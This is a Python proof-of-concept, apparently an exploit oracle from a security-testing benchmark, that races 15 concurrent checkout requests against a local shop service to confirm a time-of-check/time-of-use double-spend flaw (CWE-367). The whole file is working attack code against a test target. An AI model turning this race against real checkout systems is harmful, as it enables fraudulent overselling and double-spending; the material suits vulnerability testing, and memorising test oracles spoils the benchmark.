"""PoC: TOCTOU race in async checkout (CWE-367)."""
import concurrent.futures
import time
from mosaic.oracle.exploit import ExploitTest


class CheckoutRaceExploit(ExploitTest):
    """Race condition: double-spend via TOCTOU in async payment callback."""

    def __init__(self, base_url: str = "http://localhost:39120"):
        super().__init__(base_url)

    @property
    def chain_id(self) -> str:
        return "express_checkout_race"

    def setup(self) -> None:
        pass

    def execute(self) -> tuple[bool, str]:
        evidence = []

        # Check initial stock for product 4 (stock=1)
        resp = self.http_get("/v1/checkout/inventory/4")
        if not resp.ok:
            # Try alternate path
            resp = self.http_get("/v1/checkout/inventory")
            if resp.ok:
                items = resp.json()
                if isinstance(items, list):
                    p4 = [p for p in items if isinstance(p, dict) and p.get("id") == 4]
                    initial_stock = p4[0].get("stock", 0) if p4 else 0
                else:
                    initial_stock = 0
            else:
                return False, f"Inventory endpoint: {resp.status_code}"
        else:
            initial_stock = resp.json().get("stock", 0)

        evidence.append(f"Initial stock: {initial_stock}")

        def send_checkout(idx):
            return self.http_post("/v1/checkout",
                json={"product_id": 4, "quantity": 1})

        # Fire 15 concurrent checkout requests
        with concurrent.futures.ThreadPoolExecutor(max_workers=15) as ex:
            futures = [ex.submit(send_checkout, i) for i in range(15)]
            results = [f.result() for f in futures]

        successes = sum(1 for r in results if r.status_code == 201)
        rejects = sum(1 for r in results if r.status_code == 409)
        already = sum(1 for r in results if r.ok and "already" in r.text.lower())
        evidence.append(f"Responses: {successes} accepted, {rejects} rejected, {already} already")

        # Wait for async callbacks
        time.sleep(3)

        # Check final stock
        resp = self.http_get("/v1/checkout/inventory/4")
        final_stock = 0
        if resp.ok:
            final_stock = resp.json().get("stock", 0)
        evidence.append(f"Final stock: {final_stock}")

        # Check orders
        resp = self.http_get("/v1/checkout/orders")
        order_count = 0
        completed_count = 0
        if resp.ok:
            all_orders = resp.json()
            if isinstance(all_orders, list):
                matching = [o for o in all_orders
                            if isinstance(o, dict) and o.get("product_id") == 4]
                order_count = len(matching)
                completed_count = sum(1 for o in matching
                                      if o.get("status") in ("completed", "fulfilled"))
        evidence.append(f"Orders for product 4: {order_count}, completed: {completed_count}")

        if completed_count > 1 or final_stock < 0:
            return True, (
                f"CWE-367 TOCTOU race confirmed. {completed_count} completed orders "
                f"for stock=1 product. Final stock={final_stock}. "
                + " | ".join(evidence)
            )
        if successes > 1 and already == 0:
            return True, (
                f"CWE-367 TOCTOU race likely. {successes} accepted, none already. "
                + " | ".join(evidence)
            )
        return False, "Race not triggered. " + " | ".join(evidence)
